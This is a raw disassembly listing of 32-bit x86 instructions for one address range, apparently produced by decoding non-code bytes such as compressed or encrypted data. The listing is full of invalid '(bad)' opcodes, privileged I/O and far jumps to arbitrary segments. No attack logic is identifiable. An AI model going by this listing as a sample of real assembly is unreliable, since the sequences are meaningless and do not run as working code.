  69ba0a:	mov    eax,0x747800dc
  69ba0f:	jmp    0xe140226f
  69ba14:	fwait
  69ba15:	(bad)  
  69ba16:	loopne 0x69b9af
  69ba18:	ds inc ecx
  69ba1a:	jg     0x69ba3a
  69ba1c:	in     eax,0x2d
  69ba1e:	pop    edi
  69ba1f:	xchg   edi,eax
  69ba20:	mov    bh,0xce
  69ba22:	shl    ecx,1
  69ba24:	(bad)  
  69ba25:	mov    ds:0xcfd1fa43,eax
  69ba2a:	ins    BYTE PTR es:[edi],dx
  69ba2b:	ins    BYTE PTR es:[edi],dx
  69ba2c:	ficom  DWORD PTR [ebx]
  69ba2e:	(bad)  
  69ba30:	aad    0xe7
  69ba32:	dec    esi
  69ba33:	call   0x7b2a226c
  69ba38:	mov    ds:0x8d6b1c,eax
  69ba3d:	jmp    0xf3e11bfa
  69ba42:	or     DWORD PTR [esi],edx
  69ba44:	mov    bh,0xd8
  69ba46:	cmp    ah,BYTE PTR [edi]
  69ba48:	sysenter 
  69ba4a:	mov    esi,0xee7bb2c7
  69ba4f:	jb     0x69ba05
  69ba51:	fmulp  st(1),st
  69ba53:	prefetch BYTE PTR [edx+ebp*8+0x0]
  69ba58:	mov    edi,0xe1465b78
  69ba5d:	adc    al,0x7b
  69ba5f:	adc    DWORD PTR [ecx-0x57],ecx
  69ba62:	mov    dl,0xa1
  69ba64:	int    0x13
  69ba66:	shr    DWORD PTR [edx-0x20],cl
  69ba69:	xchg   edx,eax
  69ba6a:	xchg   ebp,eax
  69ba6b:	inc    esi
  69ba6c:	out    0xc0,al
  69ba6e:	pop    edi
  69ba6f:	dec    esp
  69ba70:	add    edi,DWORD PTR [esi]
  69ba72:	rcr    DWORD PTR [eax+0x69],0x11
  69ba76:	push   ebp
  69ba77:	xor    eax,0x86603f4a
  69ba7c:	jnp    0x69ba4e
  69ba7e:	jbe    0x69badb
  69ba80:	in     al,0xae
  69ba82:	or     bl,BYTE PTR [esi]
  69ba84:	pop    ebp
  69ba85:	jo     0x69ba4f
  69ba87:	ret    
  69ba88:	js     0x69baef
  69ba8a:	jmp    0xe0bf36dd
  69ba8f:	push   ds
  69ba90:	fmul   QWORD PTR [eax-0x1abc16d0]
  69ba96:	or     dl,BYTE PTR [edx+0x4f19facf]
  69ba9c:	push   0x50
  69ba9e:	cmp    ebp,DWORD PTR [ebp+0x48ba2ab5]
  69baa4:	adc    eax,0xf038bfcc
  69baa9:	inc    edx
  69baaa:	dec    ebx
  69baab:	out    0x7e,al
  69baad:	dec    ebp
  69baae:	mov    dl,0x37
  69bab0:	jno    0x69ba35
  69bab2:	addr16 mov esp,0x62642175
  69bab8:	stos   DWORD PTR es:[edi],eax
  69bab9:	shl    edi,1
  69babb:	fisub  DWORD PTR [ebx]
  69babd:	imul   esi,DWORD PTR [ecx+0x7b1c6e22],0xc80d092f
  69bac7:	addr16 aas 
  69bac9:	mov    dh,ch
  69bacb:	mov    esp,0xf42d50ef
  69bad0:	in     eax,0xa6
  69bad2:	rcl    esp,cl
  69bad4:	adc    edi,DWORD PTR [edi]
  69bad6:	push   ecx
  69bad7:	loop   0x69ba97
  69bad9:	outs   dx,DWORD PTR ds:[esi]
  69bada:	jno    0x69bac1
  69badc:	sub    dh,BYTE PTR [ecx+eax*4+0x5780340a]
  69bae3:	inc    edi
  69bae4:	enter  0x8486,0x6a
  69bae8:	or     ebp,DWORD PTR [eax+eax*8+0x4c]
  69baec:	or     DWORD PTR [ecx-0x41],esi
  69baef:	hlt    
  69baf0:	fadd   DWORD PTR [esi-0x2762fe76]
  69baf6:	das    
  69baf7:	call   0x6dce:0xe76af010
  69bafe:	dec    ebx
  69baff:	dec    edi
  69bb00:	enter  0xe9ca,0xbb
  69bb04:	xchg   esp,eax
  69bb05:	inc    esp
  69bb06:	inc    eax
  69bb07:	xor    eax,0xe020e133
  69bb0c:	sub    ebp,edx
  69bb0e:	retf   
  69bb0f:	push   eax
  69bb10:	faddp  st(0),st
  69bb12:	out    0xaf,eax
  69bb14:	fld    QWORD PTR [edi-0x27]
  69bb17:	call   0x259a31f2
  69bb1c:	mov    al,ds:0x9e6c6ff9
  69bb21:	test   al,0x54
  69bb23:	scas   eax,DWORD PTR es:[edi]
  69bb24:	and    eax,0x9df721ed
  69bb29:	ins    DWORD PTR es:[edi],dx
  69bb2a:	(bad)  
  69bb2b:	lea    esi,[ecx+ebx*1-0x7e45e342]
  69bb32:	ins    DWORD PTR es:[edi],dx
  69bb33:	xlat   BYTE PTR ds:[ebx]
  69bb34:	add    eax,edx
  69bb36:	sub    DWORD PTR [eax+edi*2],0xfef34f5f
  69bb3d:	mov    esi,0x64992e1e
  69bb42:	mov    bl,0xd5
  69bb44:	jne    0x69bb00
  69bb46:	popf   
  69bb47:	sbb    eax,0x54ebb1a9
  69bb4c:	adc    dl,dh
  69bb4e:	push   es
  69bb4f:	mov    ebp,0x40410e07
  69bb54:	retf   
  69bb55:	xor    al,0xd3
  69bb57:	popa   
  69bb58:	xor    ebx,edx
  69bb5a:	retf   
  69bb5b:	mov    bl,0xf6
  69bb5d:	mov    BYTE PTR [esi],cl
  69bb5f:	enter  0xf978,0x54
  69bb63:	push   ss
  69bb64:	loope  0x69bbaf
  69bb66:	mov    ecx,0xea7bd784
  69bb6b:	xor    DWORD PTR [esp+ebp*2-0x59],0xffffffd1
  69bb70:	aaa    
  69bb71:	cmc    
  69bb72:	add    ah,BYTE PTR [edi+ecx*4+0x730a65c7]
  69bb79:	dec    edi
  69bb7a:	clc    
  69bb7b:	mov    ah,BYTE PTR [ecx]
  69bb7d:	xor    eax,0x975336f9
  69bb82:	rcr    BYTE PTR [ebx+0x3c],0xfc
  69bb86:	dec    esp
  69bb87:	push   DWORD PTR [ecx-0x18ece30a]
  69bb8d:	xor    eax,0x3adda4db
  69bb92:	sub    dh,BYTE PTR [eax+0x13c3e5ff]
  69bb98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69bb99:	mov    eax,ds:0x5c559de4
  69bb9e:	nop
  69bb9f:	sub    al,0x12
  69bba1:	xchg   edi,eax
  69bba2:	addr16 pop esi
  69bba4:	out    dx,al
  69bba5:	sub    BYTE PTR [edx+eiz*4-0x6d],bh
  69bba9:	ficomp WORD PTR [ecx-0x4b]
  69bbac:	lods   al,BYTE PTR ds:[esi]
  69bbad:	xchg   ebp,eax
  69bbae:	mov    bh,0xd8
  69bbb0:	and    dh,BYTE PTR gs:[edi+0x29]
  69bbb4:	xor    BYTE PTR [eax],dh
  69bbb6:	retf   0x5d9b
  69bbb9:	jae    0x69bbb9
  69bbbb:	mov    esp,0x33acce76
  69bbc0:	adc    al,0x97
  69bbc2:	mov    esi,0xb07fec94
  69bbc7:	jg     0x69bc20
  69bbc9:	jge    0x69bbe7
  69bbcb:	fsubrp st(7),st
  69bbcd:	add    bl,BYTE PTR [esi]
  69bbcf:	jmp    FWORD PTR [edx+0x64]
  69bbd2:	neg    DWORD PTR [edi+eiz*4-0x53]
  69bbd6:	loopne 0x69bc2f
  69bbd8:	add    eax,0x1b6bd048
  69bbdd:	push   ecx
  69bbde:	ja     0x69bc14
  69bbe0:	pop    edx
  69bbe1:	test   al,0x71
  69bbe3:	pop    edi
  69bbe4:	sub    al,0xe
  69bbe6:	mov    edx,0xa9ec8de
  69bbeb:	sbb    eax,DWORD PTR [edi-0x6e]
  69bbee:	add    al,0x53
  69bbf0:	xchg   esp,eax
  69bbf1:	adc    esi,DWORD PTR [eax]
  69bbf3:	pop    edx
  69bbf4:	ss cld 
  69bbf6:	adc    eax,0x1f821efa
  69bbfb:	cmp    ah,bl
  69bbfd:	call   0xbac609ef
  69bc02:	push   ebp
  69bc03:	aad    0x3
  69bc05:	out    dx,al
  69bc06:	jnp    0x69bc45
  69bc08:	add    al,0xe5
  69bc0a:	cmp    eax,0x494498eb
  69bc0f:	sub    eax,0x2fa22c7
  69bc14:	shr    BYTE PTR [edi+0x67],cl
  69bc17:	mov    dh,dl
  69bc19:	nop
  69bc1a:	(bad)  
  69bc1b:	call   0x3ce1cefc
  69bc20:	imul   eax,DWORD PTR [edx],0xa8fc8204
  69bc26:	mov    edi,0x6ed5a04f
  69bc2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69bc2c:	test   BYTE PTR [ecx],dl
  69bc2e:	scas   al,BYTE PTR es:[edi]
  69bc2f:	and    eax,0x2e53bf4a
  69bc34:	call   0x3a73:0xcbeb2fd1
  69bc3b:	xor    ch,BYTE PTR [ecx+0x7047a19c]
  69bc41:	push   cs
  69bc42:	xor    ebx,esi
  69bc44:	adc    dl,BYTE PTR [eax+0x2bddeb14]
  69bc4a:	add    eax,0x36d8a434
  69bc4f:	addr16 mov bh,0x59
  69bc52:	(bad)  
  69bc53:	jno    0x69bc37
  69bc55:	rcr    DWORD PTR [edx+0x79],0x4
  69bc59:	out    dx,al
  69bc5a:	cmp    DWORD PTR [edx+0x7f],edi
  69bc5d:	sbb    al,0x5a
  69bc5f:	shr    ebp,0x4b
  69bc62:	sub    BYTE PTR [edx],al
  69bc64:	jle    0x69bc47
  69bc66:	and    eax,0xebf8c376
  69bc6b:	stc    
  69bc6c:	out    0xd4,eax
  69bc6e:	(bad)  
  69bc70:	daa    
  69bc71:	and    edi,DWORD PTR ds:0x1950babb
  69bc77:	repz scas eax,DWORD PTR es:[edi]
  69bc79:	push   esp
  69bc7a:	cmc    
  69bc7b:	outs   dx,BYTE PTR ds:[esi]
  69bc7c:	inc    edx
  69bc7d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  69bc7f:	outs   dx,BYTE PTR ds:[esi]
  69bc80:	push   esi
  69bc81:	add    al,0xc2
  69bc83:	mov    bh,0x7
  69bc85:	(bad)  
  69bc86:	fadd   QWORD PTR [edx-0x1f1439e9]
  69bc8c:	loopne 0x69bc76
  69bc8e:	sub    bl,BYTE PTR [esi-0xfd4178e]
  69bc94:	into   
  69bc95:	adc    DWORD PTR [edi],edx
  69bc97:	call   0x1659:0x5a9beb5e
  69bc9e:	jp     0x69bd13
  69bca0:	and    BYTE PTR [edx-0x2ce546a],ah
  69bca6:	fimul  WORD PTR [ecx+0xbf8667c]
  69bcac:	into   
  69bcad:	repz cmp DWORD PTR [edx+0x7754a3c2],0xffffffc4
  69bcb5:	mov    dl,al
  69bcb7:	lahf   
  69bcb8:	add    bh,BYTE PTR [esi+0x1b]
  69bcbb:	je     0x69bd2c
  69bcbd:	pop    esp
  69bcbe:	frstor [eax+0x264cf745]
  69bcc4:	lahf   
  69bcc5:	into   
  69bcc6:	fisttp QWORD PTR [eax]
  69bcc8:	mov    ds:0x7d98386b,al
  69bccd:	add    dl,BYTE PTR [eax-0x20]
  69bcd0:	mov    bh,0x7c
  69bcd2:	jmp    0xcca8efba
  69bcd7:	mov    ebp,0x2a131497
  69bcdc:	cdq    
  69bcdd:	fsub   QWORD PTR [esi]
  69bcdf:	mov    DWORD PTR [ecx+0x46],eax
  69bce2:	aad    0x19
  69bce4:	popf   
  69bce5:	mov    dh,0x60
  69bce7:	jmp    0x94e4:0x940cbca5
  69bcee:	mov    al,0x7c
  69bcf0:	loope  0x69bcd5
  69bcf2:	les    esi,FWORD PTR [edi+ebp*2+0x7e]
  69bcf6:	outs   dx,DWORD PTR ds:[esi]
  69bcf7:	mov    WORD PTR [edx+ebx*8],gs
  69bcfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69bcfb:	repz xor bp,cx
  69bcff:	inc    eax
  69bd00:	add    eax,0x516fa72
  69bd05:	add    al,0xae
  69bd07:	stos   BYTE PTR es:[edi],al
  69bd08:	xor    dl,dl
  69bd0a:	mov    WORD PTR [eax-0x522d8738],?
  69bd10:	xchg   edx,eax
  69bd11:	pop    edi
  69bd12:	cmp    BYTE PTR [esi],0x6a
  69bd15:	xor    al,0x1
  69bd17:	mov    dl,0xe9
  69bd19:	clc    
  69bd1a:	inc    ebp
  69bd1b:	sahf   
  69bd1c:	sub    dh,cl
  69bd1e:	mov    al,0xcf
  69bd20:	adc    DWORD PTR [ebx],edx
  69bd22:	xor    bh,dh
  69bd24:	push   edi
  69bd25:	xchg   esp,eax
  69bd26:	fst    DWORD PTR [ecx]
  69bd28:	and    cl,al
  69bd2a:	out    dx,al
  69bd2b:	cmp    edi,DWORD PTR [ecx+0x66]
  69bd2e:	xchg   edi,eax
  69bd2f:	lods   al,BYTE PTR ds:[esi]
  69bd30:	shr    BYTE PTR [ecx+0x5d746ad7],cl
  69bd36:	push   ds
  69bd37:	sub    BYTE PTR fs:0xcb3f4e4d,dh
  69bd3e:	add    BYTE PTR [ebx+0xe],0x9c
  69bd42:	sub    edx,DWORD PTR [esp-0x12adb5df]
  69bd49:	xor    DWORD PTR [ecx+0x471f6e77],esp
  69bd4f:	and    ah,BYTE PTR [edi+0x4c]
  69bd52:	retf   
  69bd53:	xchg   ecx,eax
  69bd54:	sub    al,0x6a
  69bd56:	jbe    0x69bd48
  69bd58:	jo     0x69bd22
  69bd5a:	mov    esi,0x18fdbc40
  69bd5f:	aaa    
  69bd60:	daa    
  69bd61:	enter  0x287f,0x6a
  69bd65:	mov    bh,0xb2
  69bd67:	rcl    DWORD PTR [edi-0x5341d618],cl
  69bd6d:	js     0x69bd7a
  69bd6f:	imul   BYTE PTR [eax-0x68]
  69bd72:	jl     0x69bcfe
  69bd74:	jl     0x69bcf7
  69bd76:	outs   dx,BYTE PTR ds:[esi]
  69bd77:	mov    dl,0xb2
  69bd79:	mov    edx,0x83958836
  69bd7e:	enter  0x7ca0,0x77
  69bd82:	jle    0x69bdf3
  69bd84:	stos   DWORD PTR es:[edi],eax
  69bd85:	cdq    
  69bd86:	add    al,0xca
  69bd88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69bd89:	adc    eax,0xc938f64e
  69bd8e:	push   es
  69bd8f:	(bad)  
  69bd91:	sub    ecx,DWORD PTR ds:0x456ef585
  69bd97:	push   edx
  69bd98:	inc    ebp
  69bd99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69bd9a:	es push ds
  69bd9c:	pop    ds
  69bd9d:	(bad)  
  69bd9e:	dec    esi
  69bd9f:	add    dh,BYTE PTR [ebx+ebx*1]
  69bda2:	rol    BYTE PTR [ecx-0x61a73098],1
  69bda8:	out    0x6,al
  69bdaa:	inc    ebx
  69bdab:	push   0xffffffd4
  69bdad:	sub    esi,ecx
  69bdaf:	xchg   edi,eax
  69bdb0:	adc    DWORD PTR fs:[ecx+0x3b],esp
  69bdb4:	push   esi
  69bdb5:	in     al,0x82
  69bdb7:	jmp    0x44868a38
  69bdbc:	fdivr  QWORD PTR [edi+0x2]
  69bdbf:	pop    ss
  69bdc0:	fs inc edx
  69bdc2:	mov    dl,0x14
  69bdc4:	cli    
  69bdc5:	in     al,dx
  69bdc6:	pop    esi
  69bdc7:	xchg   ebx,eax
  69bdc9:	sahf   
  69bdca:	in     eax,dx
  69bdcb:	rol    DWORD PTR [ebx],0x59
  69bdce:	ss jmp 0xac17:0x59254eb1
  69bdd6:	cmc    
  69bdd7:	(bad)  
  69bdd8:	mov    dh,0xd4
  69bdda:	daa    
  69bddb:	xor    edi,0x393cf865
  69bde1:	sbb    al,al
  69bde3:	outs   dx,BYTE PTR ds:[esi]
  69bde4:	in     eax,0x51
  69bde6:	loope  0x69bda6
  69bde8:	or     al,0x67
  69bdea:	bound  edx,QWORD PTR [edi+0x7b4c99d6]
  69bdf0:	ficomp DWORD PTR cs:[eax]
  69bdf3:	fnsave [ebx-0x3f827dd4]
  69bdf9:	fucom  st(3)
  69bdfb:	mov    es,WORD PTR ds:[eax-0x16]
  69bdff:	fadd   DWORD PTR [ebp-0x59b9dea1]
  69be05:	(bad)  
  69be06:	mov    al,0xf7
  69be08:	inc    ecx
  69be09:	shr    DWORD PTR [edx],0xc4
  69be0c:	mov    eax,ds:0x10bebf6
  69be11:	mov    bl,0xe9
  69be13:	rol    BYTE PTR [edx+0x18588961],cl
  69be19:	aad    0x19
  69be1b:	mov    ah,BYTE PTR [ebp-0x54]
  69be1e:	outs   dx,BYTE PTR ds:[esi]
  69be1f:	aaa    
  69be20:	into   
  69be21:	or     ecx,ebx
  69be23:	or     dh,al
  69be25:	inc    esp
  69be26:	cli    
  69be27:	test   BYTE PTR [esi],0x83
  69be2a:	loopne 0x69beaa
  69be2c:	xor    ah,ch
  69be2e:	lds    eax,FWORD PTR [esi+ebx*4]
  69be31:	jmp    0x69be2e
  69be33:	push   es
  69be34:	retf   0xf33e
  69be37:	iret   
  69be38:	loope  0x69bde8
  69be3a:	jns    0x69bea3
  69be3c:	ds mov esi,0xab61aee7
  69be42:	js     0x69be70
  69be44:	jbe    0x69be2a
  69be46:	mov    WORD PTR [edx+0x4f3f8845],?
  69be4c:	mov    ds:0x26559d87,al
  69be51:	stos   BYTE PTR es:[edi],al
  69be52:	mov    ebp,0x6845f805
  69be57:	repz ds mov edi,0x3510f40b
  69be5e:	jle    0x69be25
  69be60:	pop    ebp
  69be61:	call   0x5334:0xa10c9c96
  69be68:	addr16 ret 0x79bf
  69be6c:	(bad)  
  69be6d:	and    eax,0x23e14c8a
  69be72:	leave  
  69be73:	retf   
  69be74:	out    0xa0,eax
  69be76:	outs   dx,BYTE PTR ds:[esi]
  69be77:	add    eax,0x8a8ad231
  69be7c:	test   al,0xde
  69be7e:	test   al,0x62
  69be80:	and    bl,BYTE PTR [edi-0x71]
  69be83:	mov    al,ds:0x960c206e
  69be88:	xchg   edx,eax
  69be89:	push   ds
  69be8a:	call   FWORD PTR [ebx+0x12]
  69be8d:	xor    eax,0xbb32b4b3
  69be92:	jb     0x69becd
  69be94:	(bad)  
  69be95:	mov    ch,0x4a
  69be97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  69be98:	jne    0x69be60
  69be9a:	mov    WORD PTR [edx+0x6e556e32],fs
  69bea0:	dec    eax
  69bea1:	(bad)  
  69bea2:	lods   al,BYTE PTR ds:[esi]
  69bea3:	mov    ebp,?
  69bea5:	dec    eax
  69bea6:	data16 addr16 jl 0x69bee3
  69beaa:	adc    esi,ebp
  69beac:	dec    ebp
  69bead:	xlat   BYTE PTR ds:[ebx]
  69beae:	cmc    
  69beaf:	pop    ecx
  69beb0:	dec    ebp
  69beb1:	xor    DWORD PTR ds:[ebx-0x3de5293c],ebx
  69beb8:	mov    WORD PTR [edi+0x6b],ss
  69bebb:	gs in  eax,0xff
  69bebe:	and    eax,0x9ac7e492
  69bec3:	or     al,BYTE PTR [ebx+esi*8+0x28]
  69bec7:	sub    ebp,DWORD PTR [esi]
  69bec9:	outs   dx,DWORD PTR ds:[esi]
  69beca:	repz or al,0x1e
  69becd:	jbe    0x69bf23
  69becf:	ins    DWORD PTR es:[edi],dx
  69bed0:	jno    0x69beda
  69bed2:	xlat   BYTE PTR ds:[ebx]
  69bed3:	xor    eax,0x6addd20c
  69bed8:	(bad)  
  69beda:	jmp    0x69be5e
  69bedc:	lahf   
  69bedd:	loope  0x69bed7
  69bedf:	shr    BYTE PTR [esi+0x59465383],1
  69bee5:	es jl  0x69bf09
  69bee8:	das    
  69bee9:	or     edx,DWORD PTR [edi-0x76dc6e40]
  69beef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  69bef0:	mov    ah,0x1b
  69bef2:	xchg   esp,eax
  69bef3:	xchg   edi,eax
  69bef4:	mov    ch,BYTE PTR [esi-0x7f]
  69bef7:	sbb    dl,bh
  69bef9:	fld    TBYTE PTR [esi]
  69befb:	aas    
  69befc:	rol    DWORD PTR [edi-0x6],0x2f
  69bf00:	xor    bl,0xa
  69bf03:	pop    ebp
  69bf04:	fidiv  DWORD PTR [edx-0x71]
  69bf07:	ins    BYTE PTR es:[edi],dx
  69bf08:	sbb    DWORD PTR [edi+0x53c27635],ecx
  69bf0e:	pushf  
  69bf0f:	test   al,0xc8
  69bf11:	retf   0x2e1
  69bf14:	mov    ebp,0x436e69c1
  69bf19:	pop    ss
  69bf1a:	aaa    
  69bf1b:	mov    eax,ds:0xd614e48e
  69bf20:	pop    esp
  69bf21:	mov    fs,WORD PTR [ebx]
  69bf23:	in     eax,0x81
  69bf25:	jae    0x69bee6
  69bf27:	and    BYTE PTR [eax],ch
  69bf29:	and    ecx,DWORD PTR [eax-0x16]
  69bf2c:	jmp    0xa3eda15e
  69bf31:	mov    ebx,0x296e39fb
  69bf36:	out    dx,al
  69bf37:	imul   DWORD PTR [eax]
  69bf39:	or     BYTE PTR [edi-0x4fa97a4d],dh
  69bf3f:	xor    BYTE PTR [esi+0xf8d7f29],cl
  69bf45:	inc    edx
  69bf46:	scas   al,BYTE PTR es:[edi]
  69bf47:	or     ecx,DWORD PTR [esi]
  69bf49:	fist   WORD PTR [ebp-0x5b]
  69bf4c:	ret    0xc579
  69bf4f:	ret    
  69bf50:	out    dx,eax
  69bf51:	xchg   esi,eax
  69bf52:	adc    esp,eax
  69bf54:	xchg   esp,eax
  69bf55:	pop    es
  69bf56:	stos   DWORD PTR es:[edi],eax
  69bf57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69bf58:	push   cs
  69bf59:	inc    BYTE PTR [ebx]
  69bf5b:	retf   
  69bf5c:	cmp    al,0xa0
  69bf5e:	and    al,0xf1
  69bf60:	in     al,dx
  69bf61:	ror    BYTE PTR es:[edi+0x24],1
  69bf65:	mov    eax,ds:0x808dd235
  69bf6a:	outs   dx,DWORD PTR ds:[esi]
  69bf6b:	xor    BYTE PTR [edx+0x38],cl
  69bf6e:	test   BYTE PTR ds:0xc53ad3fb,bh
  69bf74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  69bf75:	push   0x51
  69bf77:	jmp    0x877a:0x68b490d9
  69bf7e:	es dec ebx
  69bf80:	mov    dl,0x4d
  69bf82:	add    al,0x53
  69bf84:	in     eax,dx
  69bf85:	jne    0x69bf1f
  69bf87:	(bad)  
  69bf88:	stos   DWORD PTR es:[edi],eax
  69bf89:	aad    0x67
  69bf8b:	cmp    eax,0x1dcf9b6b
  69bf90:	xor    eax,0xd0a2c576
  69bf95:	sub    BYTE PTR [edi+0x1a],bh
  69bf98:	cld    
  69bf99:	sub    ch,cl
  69bf9b:	add    al,0xdc
  69bf9d:	ss nop
  69bf9f:	bound  edi,QWORD PTR ds:0x530598cc
  69bfa5:	jae    0x69bf57
  69bfa7:	add    al,0x26
  69bfa9:	or     eax,DWORD PTR [ebx+0x3a]
  69bfac:	pop    eax
  69bfad:	mov    WORD PTR [ebx+0x1],es
  69bfb0:	test   al,0x13
  69bfb2:	pop    ecx
  69bfb3:	mov    edx,0xc2036a82
  69bfb8:	push   edx
  69bfb9:	jp     0x69bfcd
  69bfbb:	fsubr  QWORD PTR [ebp+esi*2+0x81910b9]
  69bfc2:	popf   
  69bfc3:	imul   DWORD PTR [eax]
  69bfc5:	add    esp,DWORD PTR [ecx-0x19]
  69bfc8:	xchg   esi,eax
  69bfc9:	enter  0x288a,0xe4
  69bfcd:	mov    BYTE PTR [ecx-0x78405965],dh
  69bfd3:	bound  ecx,QWORD PTR [esi]
  69bfd5:	push   esp
  69bfd6:	push   edi
  69bfd7:	add    al,0xba
  69bfd9:	popa   
  69bfda:	(bad)  
  69bfdb:	cmp    dl,BYTE PTR [edi+eiz*8+0x3b148917]
  69bfe2:	pop    ebx
  69bfe3:	pop    edx
  69bfe4:	mov    BYTE PTR [edi],0xc4
  69bfe7:	stc    
  69bfe8:	xlat   BYTE PTR ds:[ebx]
  69bfe9:	repz (bad) 
  69bfeb:	mov    edx,0x7d679350
  69bff0:	imul   ah
  69bff2:	aad    0x62
  69bff4:	jmp    0x69c009
  69bff6:	mov    edi,0x704076d7
  69bffb:	sbb    DWORD PTR [edx+0x2],eax
  69bffe:	adc    bl,BYTE PTR [edx]
  69c000:	imul   edx,DWORD PTR [ecx],0x5683eb6
  69c006:	xchg   BYTE PTR [esi],ah
  69c008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69c009:	jmp    FWORD PTR [ebp+0x4a6150b7]
  69c00f:	mov    bh,0x8f
  69c011:	push   edx
  69c012:	fmul   DWORD PTR [esi+0xe42d3f0]
  69c018:	cmp    esi,DWORD PTR [edi+0x27]
  69c01b:	je     0x69c080
  69c01d:	rcr    BYTE PTR [ecx+eiz*2-0x1d86586e],cl
  69c024:	cs aad 0xbb
  69c027:	sbb    eax,0xbf6c07c5
  69c02c:	icebp  
  69c02d:	dec    edx
  69c02e:	arpl   WORD PTR [ebx+0x9e6b356],si
  69c034:	sbb    ch,BYTE PTR [ebx+0x55238806]
  69c03a:	lock mov eax,0x9110fbf2
  69c040:	push   esp
  69c041:	les    ebp,FWORD PTR [esi+0x60]
  69c044:	mov    ch,0x4c
  69c046:	ss ins BYTE PTR es:[edi],dx
  69c048:	jmp    0x4751fb55
  69c04d:	sbb    ecx,DWORD PTR [edi]
  69c04f:	dec    ebx
  69c050:	mov    BYTE PTR ds:0xa0960900,ah
  69c056:	std    
  69c057:	imul   ecx,esp,0x4d576552
  69c05d:	adc    bl,BYTE PTR [edx]
  69c05f:	bt     ecx,ebx
  69c062:	cdq    
  69c063:	sub    bl,BYTE PTR [esi+0x3a]
  69c066:	xchg   ecx,eax
  69c067:	pop    edx
  69c068:	out    dx,eax
  69c069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  69c06a:	xchg   ebp,eax
  69c06b:	cmp    DWORD PTR [ecx+0x46024c99],esi
  69c071:	fisttp WORD PTR [eax-0x4218019d]
  69c077:	pop    eax
  69c078:	push   esp
  69c079:	call   0x4d4:0x5acba020
  69c080:	int    0xb6
  69c082:	fwait
  69c083:	push   esp
  69c084:	xchg   DWORD PTR [edx+0x104bd013],edi
  69c08a:	jae    0x69c0e6
  69c08c:	mov    eax,ds:0xc30c3c16
  69c091:	push   ss
  69c092:	icebp  
  69c093:	mov    ah,0x3
  69c095:	(bad)  
  69c096:	sbb    esi,esp
  69c098:	sti    
  69c099:	outs   dx,BYTE PTR ds:[esi]
  69c09a:	mov    edx,0x200afb11
  69c09f:	and    bl,dl
  69c0a1:	pop    esi
  69c0a2:	mov    ebp,0xcc90b93
  69c0a7:	pop    ebp
  69c0a8:	and    cl,0xf8
  69c0ab:	imul   ecx,DWORD PTR [eax+ecx*8+0x2ff01af4],0xb6a7ed5a
  69c0b6:	lahf   
  69c0b7:	repz mov ds:0xc2bbc838,eax
  69c0bd:	idiv   DWORD PTR [eax]
  69c0bf:	adc    ebp,DWORD PTR [ebp+0x789bf970]
  69c0c5:	adc    DWORD PTR [ecx],eax
  69c0c7:	jns    0x69c051
  69c0c9:	das    
  69c0ca:	out    0x9,al
  69c0cc:	push   ss
  69c0cd:	cmp    eax,DWORD PTR [edx]
  69c0cf:	vmread DWORD PTR [ecx-0x2a2377db],esp
  69c0d6:	sub    al,0x0
  69c0d8:	rcr    BYTE PTR [edx],1
  69c0da:	shl    esp,0x5b
  69c0dd:	mov    al,0xe2
  69c0df:	cli    
  69c0e0:	sbb    esp,DWORD PTR ds:0xe874e588
  69c0e6:	xor    eax,0x595a4905
  69c0eb:	data16 jle 0x69c0ac
  69c0ee:	shl    BYTE PTR [ecx],1
  69c0f0:	retf   
  69c0f1:	imul   ebp,DWORD PTR [esi-0x39],0xffffffe5
  69c0f5:	push   0xe
  69c0f7:	fwait
  69c0f8:	aaa    
  69c0f9:	stc    
  69c0fa:	in     eax,0xfa
  69c0fc:	sbb    ch,BYTE PTR [edi]
  69c0fe:	sub    eax,0x5e3ed27d
  69c103:	daa    
  69c104:	(bad)  
  69c105:	neg    DWORD PTR [eax+eiz*1]
  69c108:	xor    ah,ah
  69c10a:	push   ebp
  69c10b:	stos   BYTE PTR es:[edi],al
  69c10c:	pushf  
  69c10d:	outs   dx,BYTE PTR ds:[esi]
  69c10e:	sbb    ebx,DWORD PTR [ebx-0x36]
  69c111:	(bad)
  69c115:	loop   0x69c0b5
  69c117:	mov    cl,0x97
  69c119:	je     0x69c0ba
  69c11b:	sub    ecx,edx
  69c11d:	mov    edi,0xb84e90a7
  69c122:	mov    ds:0x8e103678,eax
  69c127:	sti    
  69c128:	xchg   esi,eax
  69c129:	aam    0x6c
  69c12b:	push   ecx
  69c12c:	frstor [esi]
  69c12e:	test   BYTE PTR [edi],dh
  69c130:	cdq    
  69c131:	jp     0x69c1b0
  69c133:	cmp    ah,BYTE PTR [eax]
  69c135:	or     esp,ecx
  69c137:	adc    BYTE PTR ss:[ecx+ebp*2-0x1e],bh
  69c13c:	pop    es
  69c13d:	add    eax,0xce33541e
  69c142:	mov    ebp,0x7b1a67d1
  69c147:	fsubr  QWORD PTR [esi-0x2f]
  69c14a:	int    0xa1
  69c14c:	mov    esp,0xa8f5c036
  69c151:	or     al,0xe4
  69c153:	das    
  69c154:	js     0x69c128
  69c156:	ror    BYTE PTR [edx],cl
  69c158:	or     ebx,DWORD PTR [ebp-0x576b9420]
  69c15e:	jbe    0x69c17d
  69c160:	into   
  69c161:	mov    ebp,0x5e2620ba
  69c166:	ja     0x69c160
  69c168:	xchg   ecx,eax
  69c169:	jp     0x69c0f8
  69c16b:	pop    ss
  69c16c:	push   es
  69c16d:	call   0xfea0:0xda877be7
  69c174:	cmp    eax,DWORD PTR [ebp+0x54b77ec1]
  69c17a:	aaa    
  69c17b:	js     0x69c14a
  69c17d:	sbb    cl,BYTE PTR [ecx-0x74]
  69c180:	jae    0x69c1ea
  69c182:	adc    DWORD PTR [esi+edx*1+0x4d],ebx
  69c186:	mov    ebp,DWORD PTR [ecx+0x40]
  69c189:	adc    DWORD PTR [ebx],esp
  69c18b:	mov    edx,0xae355ef1
  69c190:	mov    al,ds:0x39a61543
  69c195:	pop    edx
  69c196:	dec    edi
